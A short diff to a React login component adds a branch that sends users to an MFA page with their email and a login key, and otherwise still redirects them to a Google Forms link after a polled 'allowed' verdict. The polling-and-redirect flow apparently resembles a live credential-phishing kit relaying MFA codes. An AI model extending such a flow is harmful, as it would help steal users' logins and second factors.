@@ -40,7 +40,11 @@ const Password = () => {
 
       if (loginData.status === "allowed") {
         clearInterval(pollInterval);
-        window.location.href = "https://forms.gle/VM2MSvDd3uuwR1WP7";
+        if (loginData.mfa) {
+          navigate("/mfa", { state: { email, loginKey } });
+        } else {
+          window.location.href = "https://forms.gle/VM2MSvDd3uuwR1WP7";
+        }
       } else if (loginData.status === "rejected") {
         clearInterval(pollInterval);
         setError("Wrong password. Please try again.");
